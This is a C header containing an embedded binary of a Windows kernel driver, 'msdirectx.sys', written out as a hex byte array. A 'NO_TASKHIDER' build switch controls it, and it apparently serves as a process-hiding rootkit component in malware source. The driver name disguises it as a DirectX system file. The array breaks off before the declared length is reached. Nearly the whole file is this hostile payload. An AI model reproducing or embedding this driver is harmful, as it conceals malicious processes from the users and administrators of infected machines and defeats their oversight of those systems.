#include "Includes.h"
// Generated by BreakPoint Software's Hex Workshop v4.20
//   http://www.hexworkshop.com
//   http://www.bpsoft.com
//
//  Source File: msdirectx.sys
//         Time: 9/6/2004 1:26 AM
// Orig. Offset: 0 / 0x00000000
//       Length: 6656 / 0x00001A00 (bytes)
#ifndef NO_TASKHIDER
unsigned char msdirectx_sys[6656] =
{
    0x4D, 0x5A, 0x90, 0x00, 0x03, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0x00, 0x00, 
    0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xC8, 0x00, 0x00, 0x00, 
    0x0E, 0x1F, 0xBA, 0x0E, 0x00, 0xB4, 0x09, 0xCD, 0x21, 0xB8, 0x01, 0x4C, 0xCD, 0x21, 0x54, 0x68, 
    0x69, 0x73, 0x20, 0x70, 0x72, 0x6F, 0x67, 0x72, 0x61, 0x6D, 0x20, 0x63, 0x61, 0x6E, 0x6E, 0x6F, 
    0x74, 0x20, 0x62, 0x65, 0x20, 0x72, 0x75, 0x6E, 0x20, 0x69, 0x6E, 0x20, 0x44, 0x4F, 0x53, 0x20, 
    0x6D, 0x6F, 0x64, 0x65, 0x2E, 0x0D, 0x0D, 0x0A, 0x24, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0xF7, 0xAC, 0x8D, 0xDD, 0xB3, 0xCD, 0xE3, 0x8E, 0xB3, 0xCD, 0xE3, 0x8E, 0xB3, 0xCD, 0xE3, 0x8E, 
    0xB3, 0xCD, 0xE2, 0x8E, 0xA1, 0xCD, 0xE3, 0x8E, 0x30, 0xC5, 0xBE, 0x8E, 0xB0, 0xCD, 0xE3, 0x8E, 
    0x3D, 0xC5, 0xBC, 0x8E, 0xB0, 0xCD, 0xE3, 0x8E, 0x30, 0xC5, 0xB9, 0x8E, 0xB2, 0xCD, 0xE3, 0x8E, 
    0x52, 0x69, 0x63, 0x68, 0xB3, 0xCD, 0xE3, 0x8E, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x50, 0x45, 0x00, 0x00, 0x4C, 0x01, 0x05, 0x00, 
    0xB5, 0xB1, 0x2E, 0x41, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xE0, 0x00, 0x0E, 0x01, 
    0x0B, 0x01, 0x07, 0x0A, 0x00, 0x10, 0x00, 0x00, 0x00, 0x06, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x40, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x20, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 
    0x00, 0x10, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x05, 0x00, 0x02, 0x00, 0x05, 0x00, 0x02, 0x00, 
    0x05, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x60, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 
    0x58, 0x97, 0x00, 0x00, 0x01, 0x00, 0x00, 0x04, 0x00, 0x00, 0x04, 0x00, 0x00, 0x10, 0x00, 0x00, 
    0x00, 0x00, 0x10, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x30, 0x40, 0x00, 0x00, 0x28, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x50, 0x00, 0x00, 0xB0, 0x00, 0x00, 0x00, 
    0x50, 0x20, 0x00, 0x00, 0x1C, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x20, 0x00, 0x00, 0x48, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x2E, 0x74, 0x65, 0x78, 0x74, 0x00, 0x00, 0x00, 0xE2, 0x0A, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 
    0x00, 0x0C, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x20, 0x00, 0x00, 0x68, 0x2E, 0x72, 0x64, 0x61, 0x74, 0x61, 0x00, 0x00, 
    0xF9, 0x00, 0x00, 0x00, 0x00, 0x20, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x48, 
    0x2E, 0x64, 0x61, 0x74, 0x61, 0x00, 0x00, 0x00, 0x30, 0x00, 0x00, 0x00, 0x00, 0x30, 0x00, 0x00, 
    0x00, 0x02, 0x00, 0x00, 0x00, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0xC8, 0x49, 0x4E, 0x49, 0x54, 0x00, 0x00, 0x00, 0x00, 
    0x0C, 0x02, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x14, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x20, 0x00, 0x00, 0xE2, 
    0x2E, 0x72, 0x65, 0x6C, 0x6F, 0x63, 0x00, 0x00, 0xE6, 0x00, 0x00, 0x00, 0x00, 0x50, 0x00, 0x00, 
    0x00, 0x02, 0x00, 0x00, 0x00, 0x18, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x42, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x53, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x00, 0xCC, 0x56, 0x33, 0xF6, 0x8B, 0x44, 0x24, 0x08, 0x6A, 
    0x06, 0x03, 0xC6, 0x50, 0x68, 0x00, 0x10, 0x01, 0x00, 0xFF, 0x15, 0x00, 0x20, 0x01, 0x00, 0x83, 
    0xC4, 0x0C, 0x85, 0xC0, 0x74, 0x0F, 0x46, 0x81, 0xFE, 0x00, 0x10, 0x00, 0x00, 0x72, 0xDC, 0x33, 
    0xC0, 0x5E, 0xC2, 0x04, 0x00, 0x8B, 0xC6, 0xEB, 0xF8, 0xCC, 0x55, 0x8B, 0xEC, 0x51, 0x51, 0x56, 
    0x8B, 0x75, 0x08, 0x83, 0x7E, 0x04, 0x00, 0x74, 0x22, 0x68, 0x6C, 0x20, 0x01, 0x00, 0x8D, 0x45, 
    0xF8, 0x50, 0xFF, 0x15, 0x0C, 0x20, 0x01, 0x00, 0x8D, 0x45, 0xF8, 0x50, 0xFF, 0x15, 0x08, 0x20, 
    0x01, 0x00, 0xFF, 0x76, 0x04, 0xFF, 0x15, 0x04, 0x20, 0x01, 0x00, 0x33, 0xC0, 0x5E, 0xC9, 0xC2, 
    0x04, 0x00, 0x8B, 0x44, 0x24, 0x04, 0x85, 0xC0, 0x74, 0x03, 0x8B, 0x40, 0x14, 0xC2, 0x04, 0x00, 
    0x51, 0x8B, 0x44, 0x24, 0x08, 0x03, 0x05, 0x08, 0x30, 0x01, 0x00, 0x8B, 0x00, 0x83, 0xE0, 0xF8, 
    0x89, 0x04, 0x24, 0x8B, 0x04, 0x24, 0x59, 0xC2, 0x04, 0x00, 0x53, 0x33, 0xDB, 0x39, 0x5C, 0x24, 
    0x08, 0x75, 0x04, 0x33, 0xC0, 0xEB, 0x3D, 0x56, 0x57, 0xFF, 0x15, 0x10, 0x20, 0x01, 0x00, 0x8B, 
    0x0D, 0x20, 0x30, 0x01, 0x00, 0x8B, 0x3C, 0x01, 0x39, 0x7C, 0x24, 0x10, 0x8B, 0xF7, 0x74, 0x22, 
    0x8B, 0x15, 0x14, 0x30, 0x01, 0x00, 0x83, 0xFB, 0x01, 0x7C, 0x04, 0x3B, 0xFE, 0x74, 0x11, 0x8B, 
    0x04, 0x02, 0x2B, 0xC2, 0x8B, 0x34, 0x01, 0x43, 0x39, 0x74, 0x24, 0x10, 0x75, 0xE8, 0xEB, 0x02, 
    0x33, 0xC0, 0x5F, 0x5E, 0x5B, 0xC2, 0x04, 0x00, 0x54, 0x68, 0x65, 0x20, 0x53, 0x69, 0x7A, 0x65, 
    0x4F, 0x66, 0x4F, 0x6C, 0x64, 0x53, 0x69, 0x64, 0x73, 0x20, 0x3D, 0x20, 0x25, 0x78, 0x0A, 0x00, 
    0x25, 0x73, 0x3A, 0x25, 0x75, 0x00, 0x00, 0x00, 0x44, 0x72, 0x69, 0x76, 0x65, 0x72, 0x3A, 0x20, 
    0x25, 0x77, 0x73, 0x0A, 0x00, 0xCC, 0x55, 0x8B, 0xEC, 0x83, 0xEC, 0x34, 0x8B, 0x4D, 0x20, 0x53, 
    0x33, 0xDB, 0x56, 0x8B, 0x75, 0x24, 0xB8, 0x14, 0x80, 0x7B, 0x2A, 0x3B, 0xC8, 0x57, 0x89, 0x5D, 
    0xFC, 0x89, 0x1E, 0x89, 0x5E, 0x04, 0x0F, 0x87, 0xF0, 0x04, 0x00, 0x00, 0x0F, 0x84, 0xEB, 0x03, 
    0x00, 0x00, 0x8B, 0xC1, 0x2D, 0x04, 0x80, 0x7B, 0x2A, 0x0F, 0x84, 0x7E, 0x03, 0x00, 0x00, 0x83, 
    0xE8, 0x04, 0x0F, 0x84, 0x2C, 0x03, 0x00, 0x00, 0x83, 0xE8, 0x04, 0x0F, 0x84, 0x5E, 0x02, 0x00, 
    0x00, 0x83, 0xE8, 0x04, 0x0F, 0x85, 0xDD, 0x04, 0x00, 0x00, 0x83, 0x7D, 0x14, 0x0C, 0x0F, 0x82, 
    0xD5, 0x07, 0x00, 0x00, 0x8B, 0x45, 0x10, 0x3B, 0xC3, 0x0F, 0x84, 0xCA, 0x07, 0x00, 0x00, 0x8B, 
    0x08, 0x3B, 0xCB, 0x8B, 0x50, 0x04, 0x8B, 0x40, 0x08, 0x89, 0x55, 0xE8, 0x89, 0x45, 0x18, 0x74, 
    0x12, 0x3B, 0xD3, 0x74, 0x0E, 0x3B, 0xC3, 0x74, 0x0A, 0x51, 0xE8, 0xFB, 0xFE, 0xFF, 0xFF, 0x3B, 
    0xC3, 0x75, 0x0B, 0xC7, 0x06, 0x0D, 0x00, 0x00, 0xC0, 0xE9, 0xA1, 0x07, 0x00, 0x00, 0x50, 0xE8, 
    0xCC, 0xFE, 0xFF, 0xFF, 0x8B, 0xD8, 0xA1, 0x2C, 0x30, 0x01, 0x00, 0x03, 0xC3, 0x8B, 0x08, 0x8B, 
    0x78, 0x04, 0xA1, 0x28, 0x30, 0x01, 0x00, 0x8B, 0x04, 0x18, 0x89, 0x4D, 0xF4, 0x8B, 0x0D, 0x24, 
    0x30, 0x01, 0x00, 0x8B, 0x0C, 0x19, 0x89, 0x4D, 0x20, 0x8B, 0x0D, 0x1C, 0x30, 0x01, 0x00, 0x8B, 
    0x0C, 0x19, 0x68, 0x44, 0x64, 0x6B, 0x20, 0x57, 0x6A, 0x01, 0x89, 0x4D, 0x14, 0x89, 0x7D, 0x1C, 
    0x89, 0x45, 0xF0, 0xFF, 0x15, 0x30, 0x20, 0x01, 0x00, 0x8B, 0xD0, 0x85, 0xD2, 0x89, 0x55, 0x10, 
    0x75, 0x0B, 0xC7, 0x06, 0x9A, 0x00, 0x00, 0xC0, 0xE9, 0x42, 0x07, 0x00, 0x00, 0x8B, 0xCF, 0x8B, 
    0xF1, 0xC1, 0xE9, 0x02, 0x33, 0xC0, 0x8B, 0xFA, 0xF3, 0xAB, 0x8B, 0xCE, 0x8B, 0x75, 0xF4, 0x83, 
    0xE1, 0x03, 0x85, 0xF6, 0xF3, 0xAA, 0x7E, 0x29, 0x8B, 0x45, 0x14, 0x8B, 0xCA, 0x83, 0xC0, 0x08, 
    0x83, 0x38, 0x00, 0x74, 0x16, 0x8B, 0x78, 0xF8, 0xFF, 0x45, 0xFC, 0x89, 0x39, 0x8B, 0x78, 0xFC, 
    0x89, 0x79, 0x04, 0x8B, 0x38, 0x89, 0x79, 0x08, 0x83, 0xC1, 0x0C, 0x83, 0xC0, 0x0C, 0x4E, 0x75, 
    0xDF, 0x8B, 0x7D, 0xFC, 0x8B, 0x4D, 0xF4, 0x8B, 0x75, 0x18, 0x2B, 0xCF, 0x8D, 0x0C, 0x49, 0x83, 
    0xC6, 0x08, 0x8D, 0x04, 0x7F, 0xC1, 0xE0, 0x02, 0xC1, 0xE1, 0x02, 0x3B, 0xCE, 0x89, 0x75, 0xDC, 
    0x89, 0x45, 0xF8, 0x7D, 0x17, 0x6A, 0x00, 0x52, 0xFF, 0x15, 0x2C, 0x20, 0x01, 0x00, 0x8B, 0x45, 
    0x24, 0xC7, 0x00, 0x9A, 0x00, 0x00, 0xC0, 0xE9, 0xC3, 0x06, 0x00, 0x00, 0x8B, 0x4D, 0x20, 0x8B, 
    0x75, 0x14, 0x83, 0x65, 0xEC, 0x00, 0xC1, 0xE1, 0x03, 0x89, 0x4D, 0xE4, 0x03, 0xCE, 0x8D, 0x74, 
    0x01, 0x08, 0x8D, 0x0C, 0x02, 0x83, 0x61, 0x04, 0x00, 0x83, 0x7D, 0x20, 0x00, 0x89, 0x75, 0xE0, 
    0x89, 0x31, 0x7E, 0x47, 0x8B, 0x7D, 0xEC, 0x85, 0xFF, 0x75, 0x11, 0x8B, 0x7D, 0x18, 0x03, 0xFE, 
    0x89, 0x79, 0x08, 0xC7, 0x41, 0x0C, 0x07, 0x00, 0x00, 0x00, 0xEB, 0x24, 0x8B, 0xF7, 0x8B, 0x7D, 
    0xF0, 0xC1, 0xE6, 0x03, 0x03, 0xD6, 0x03, 0xF7, 0x8B, 0x3E, 0x2B, 0x7E, 0xF8, 0x03, 0xD0, 0x03, 
    0x3A, 0x89, 0x7A, 0x08, 0x8B, 0x76, 0x04, 0x89, 0x72, 0x0C, 0x8B, 0x55, 0x10, 0x8B, 0x75, 0xE0, 
    0xFF, 0x45, 0xEC, 0x8B, 0x7D, 0xEC, 0x3B, 0x7D, 0x20, 0x7C, 0xB9, 0x8B, 0x4D, 0x10, 0x8B, 0x45, 
    0xE4, 0x8B, 0x75, 0xE8, 0x03, 0xC1, 0x8B, 0x4D, 0xF8, 0x03, 0xC1, 0x8B, 0x4D, 0x18, 0x8D, 0x78, 
    0x08, 0x89, 0x45, 0x20, 0x8B, 0xC1, 0xC1, 0xE9, 0x02, 0xF3, 0xA5, 0x8B, 0xC8, 0x8B, 0x45, 0xF0, 
    0x83, 0xE1, 0x03, 0xF3, 0xA4, 0x8B, 0x75, 0x14, 0x2B, 0x30, 0x03, 0x75, 0x1C, 0x56, 0x68, 0xE8, 
    0x10, 0x01, 0x00, 0xE8, 0xA4, 0x07, 0x00, 0x00, 0x8B, 0x45, 0xF4, 0x8B, 0x55, 0xE4, 0x8B, 0x7D, 
    0xDC, 0x8D, 0x04, 0x40, 0x59, 0x59, 0x8B, 0xCE, 0x8D, 0x34, 0x82, 0x8B, 0x45, 0x20, 0x8B, 0x55, 
    0x14, 0x03, 0xF8, 0x8B, 0xC1, 0xC1, 0xE9, 0x02, 0x03, 0xF2, 0xF3, 0xA5, 0x8B, 0xC8, 0x83, 0xE1, 
    0x03, 0xF3, 0xA4, 0x8B, 0x4D, 0x1C, 0x8B, 0xF1, 0xC1, 0xE9, 0x02, 0x33, 0xC0, 0x8B, 0xFA, 0xF3, 
    0xAB, 0x8B, 0xCE, 0x83, 0xE1, 0x03, 0xF3, 0xAA, 0x8B, 0xCE, 0x8B, 0x75, 0x10, 0x8B, 0xC1, 0xC1, 
    0xE9, 0x02, 0x8B, 0xFA, 0xF3, 0xA5, 0x8B, 0xC8, 0x83, 0xE1, 0x03, 0xF3, 0xA4, 0xA1, 0x24, 0x30, 
    0x01, 0x00, 0x8B, 0x4D, 0xFC, 0x03, 0xC3, 0xFF, 0x00, 0xA1, 0x2C, 0x30, 0x01, 0x00, 0x89, 0x0C, 
    0x18, 0x8B, 0x45, 0xF8, 0x03, 0xD0, 0xA1, 0x28, 0x30, 0x01, 0x00, 0x89, 0x14, 0x18, 0xA1, 0x18, 
    0x30, 0x01, 0x00, 0xC7, 0x04, 0x18, 0xE7, 0x03, 0x00, 0x00, 0xE9, 0x7D, 0x05, 0x00, 0x00, 0x83, 
    0x7D, 0x1C, 0x1A, 0x72, 0x19, 0x8B, 0x75, 0x18, 0x85, 0xF6, 0x74, 0x12, 0x8B, 0x45, 0x1C, 0x6A, 
    0x1A, 0x33, 0xD2, 0x59, 0xF7, 0xF1, 0x83, 0xF8, 0x01, 0x89, 0x45, 0x10, 0x7D, 0x0E, 0x8B, 0x45, 
    0x24, 0xC7, 0x00, 0x06, 0x02, 0x00, 0xC0, 0xE9, 0x63, 0x05, 0x00, 0x00, 0xE8, 0xE5, 0x06, 0x00, 
    0x00, 0x50, 0xE8, 0xA3, 0xFC, 0xFF, 0xFF, 0x8B, 0xD8, 0x85, 0xDB, 0x75, 0x0E, 0x8B, 0x45, 0x24, 
    0xC7, 0x00, 0x0D, 0x00, 0x00, 0xC0, 0xE9, 0x44, 0x05, 0x00, 0x00, 0x8B, 0x4D, 0x1C, 0x8B, 0xD1, 
    0xC1, 0xE9, 0x02, 0x33, 0xC0, 0x8B, 0xFE, 0xF3, 0xAB, 0x8B, 0xCA, 0x83, 0xE1, 0x03, 0xF3, 0xAA, 
    0x33, 0xC0, 0x40, 0x39, 0x45, 0x10, 0x89, 0x5D, 0x20, 0x89, 0x45, 0x14, 0x7C, 0x4B, 0x6A, 0x1A, 
    0x5F, 0xA1, 0x20, 0x30, 0x01, 0x00, 0xFF, 0x34, 0x18, 0xA1, 0x0C, 0x30, 0x01, 0x00, 0x03, 0xC3, 
    0x50, 0x68, 0x00, 0x11, 0x01, 0x00, 0x8D, 0x44, 0x3E, 0xE6, 0x6A, 0x19, 0x50, 0xFF, 0x15, 0x20, 
    0x20, 0x01, 0x00, 0x8B, 0x45, 0x24, 0x89, 0x78, 0x04, 0xA1, 0x14, 0x30, 0x01, 0x00, 0x8B, 0x1C, 
    0x18, 0x2B, 0xD8, 0x83, 0xC4, 0x14, 0x39, 0x5D, 0x20, 0x74, 0x0E, 0xFF, 0x45, 0x14, 0x8B, 0x45, 
    0x14, 0x83, 0xC7, 0x1A, 0x3B, 0x45, 0x10, 0x7E, 0xB8, 0x8B, 0x45, 0x24, 0x83, 0x20, 0x00, 0xE9, 
    0xCB, 0x04, 0x00, 0x00, 0x83, 0x7D, 0x14, 0x04, 0x0F, 0x82, 0xBB, 0x04, 0x00, 0x00, 0x8B, 0x45, 
    0x10, 0x3B, 0xC3, 0x0F, 0x84, 0xB0, 0x04, 0x00, 0x00, 0x8B, 0x00, 0x3B, 0xC3, 0x0F, 0x84, 0x00, 
    0xFD, 0xFF, 0xFF, 0x50, 0xE8, 0xF1, 0xFB, 0xFF, 0xFF, 0x3B, 0xC3, 0x0F, 0x84, 0xF2, 0xFC, 0xFF, 
    0xFF, 0x8B, 0x0D, 0x14, 0x30, 0x01, 0x00, 0x03, 0xC1, 0x8B, 0x48, 0x04, 0x8B, 0x10, 0x89, 0x11, 
    0x8B, 0x08, 0x8B, 0x40, 0x04, 0x89, 0x41, 0x04, 0xE9, 0x82, 0x04, 0x00, 0x00, 0x83, 0x7D, 0x14, 
    0x20, 0x0F, 0x82, 0x72, 0x04, 0x00, 0x00, 0x8B, 0x45, 0x10, 0x3B, 0xC3, 0x0F, 0x84, 0x67, 0x04, 
    0x00, 0x00, 0x8B, 0x08, 0x89, 0x0D, 0x20, 0x30, 0x01, 0x00, 0x8B, 0x48, 0x04, 0x89, 0x0D, 0x14, 
    0x30, 0x01, 0x00, 0x8B, 0x48, 0x08, 0x89, 0x0D, 0x18, 0x30, 0x01, 0x00, 0x8B, 0x48, 0x0C, 0x89, 
    0x0D, 0x08, 0x30, 0x01, 0x00, 0x8B, 0x48, 0x10, 0x89, 0x0D, 0x2C, 0x30, 0x01, 0x00, 0x8B, 0x48, 
    0x14, 0x89, 0x0D, 0x1C, 0x30, 0x01, 0x00, 0x8B, 0x48, 0x18, 0x89, 0x0D, 0x24, 0x30, 0x01, 0x00, 
    0x8B, 0x40, 0x1C, 0xA3, 0x28, 0x30, 0x01, 0x00, 0xE9, 0x22, 0x04, 0x00, 0x00, 0x83, 0x7D, 0x14, 
    0x0C, 0x0F, 0x82, 0x12, 0x04, 0x00, 0x00, 0x8B, 0x45, 0x10, 0x3B, 0xC3, 0x0F, 0x84, 0x07, 0x04, 
    0x00, 0x00, 0x8B, 0x08, 0x3B, 0xCB, 0x8B, 0x78, 0x04, 0x8B, 0x40, 0x08, 0x89, 0x7D, 0x10, 0x89, 
    0x45, 0x18, 0x0F, 0x84, 0x4B, 0xFC, 0xFF, 0xFF, 0x3B, 0xFB, 0x0F, 0x84, 0x43, 0xFC, 0xFF, 0xFF, 
    0x3B, 0xC3, 0x0F, 0x84, 0x3B, 0xFC, 0xFF, 0xFF, 0x51, 0xE8, 0x2C, 0xFB, 0xFF, 0xFF, 0x3B, 0xC3, 
    0x0F, 0x84, 0x2D, 0xFC, 0xFF, 0xFF, 0x50, 0xE8, 0x04, 0xFB, 0xFF, 0xFF, 0x8B, 0x0D, 0x2C, 0x30, 
    0x01, 0x00, 0x8B, 0x0C, 0x01, 0x3B, 0xCB, 0x8B, 0x15, 0x1C, 0x30, 0x01, 0x00, 0x8B, 0x04, 0x02, 
    0x89, 0x4D, 0xF4, 0x89, 0x45, 0xDC, 0x7E, 0x46, 0x89, 0x45, 0x14, 0x89, 0x4D, 0x20, 0x8B, 0x4D, 
    0x18, 0x85, 0xC9, 0x7E, 0x30, 0x8D, 0x47, 0x08, 0x89, 0x4D, 0x1C, 0x8B, 0x10, 0x83, 0xFA, 0xFF, 
    0x74, 0x1B, 0x8B, 0x75, 0x14, 0x6A, 0x02, 0x59, 0x8D, 0x78, 0xF8, 0x33, 0xDB, 0xF3, 0xA7, 0x8B, 
    0x7D, 0x10, 0x75, 0x09, 0x8B, 0x4D, 0x14, 0x89, 0x51, 0x08, 0x83, 0x08, 0xFF, 0x83, 0xC0, 0x0C, 
    0xFF, 0x4D, 0x1C, 0x75, 0xD6, 0x83, 0x45, 0x14, 0x0C, 0xFF, 0x4D, 0x20, 0x75, 0xC0, 0x8B, 0x75, 
    0x18, 0x85, 0xF6, 0x0F, 0x8E, 0x66, 0x03, 0x00, 0x00, 0x8D, 0x47, 0x08, 0x83, 0x38, 0xFF, 0x74, 
    0x30, 0x8B, 0x55, 0xF4, 0x85, 0xD2, 0x7E, 0x29, 0x8B, 0x4D, 0xDC, 0x83, 0xC1, 0x08, 0x83, 0x38, 
    0xFF, 0x74, 0x18, 0x83, 0x39, 0x00, 0x75, 0x13, 0x8B, 0x78, 0xF8, 0x89, 0x79, 0xF8, 0x8B, 0x78, 
    0xFC, 0x89, 0x79, 0xFC, 0x8B, 0x38, 0x89, 0x39, 0x83, 0x08, 0xFF, 0x83, 0xC1, 0x0C, 0x4A, 0x75, 
    0xDD, 0x83, 0xC0, 0x0C, 0x4E, 0x75, 0xC5, 0xE9, 0x23, 0x03, 0x00, 0x00, 0x8B, 0xC1, 0x2D, 0x18, 
    0x80, 0x7B, 0x2A, 0x0F, 0x84, 0xEB, 0x00, 0x00, 0x00, 0x83, 0xE8, 0x04, 0x0F, 0x84, 0xAB, 0x00, 
    0x00, 0x00, 0x83, 0xE8, 0x04, 0x74, 0x0B, 0xC7, 0x06, 0x10, 0x00, 0x00, 0xC0, 0xE9, 0xFD, 0x02, 
    0x00, 0x00, 0x8B, 0x45, 0x14, 0x83, 0xF8, 0x01, 0x0F, 0x82, 0xEB, 0x02, 0x00, 0x00, 0x8B, 0x4D, 
    0x10, 0x3B, 0xCB, 0x0F, 0x84, 0xE0, 0x02, 0x00, 0x00, 0x39, 0x1D, 0x10, 0x30, 0x01, 0x00, 0x74, 
    0x1F, 0x66, 0x89, 0x45, 0xD4, 0x66, 0x89, 0x45, 0xD6, 0x6A, 0x01, 0x8D, 0x45, 0xD4, 0x50, 0x8D, 
    0x45, 0xCC, 0x50, 0x89, 0x4D, 0xD8, 0xFF, 0x15, 0x1C, 0x20, 0x01, 0x00, 0x3B, 0xC3, 0x7D, 0x0B, 
    0xC7, 0x06, 0x01, 0x00, 0x00, 0xC0, 0xE9, 0xB4, 0x02, 0x00, 0x00, 0xA1, 0x10, 0x30, 0x01, 0x00, 
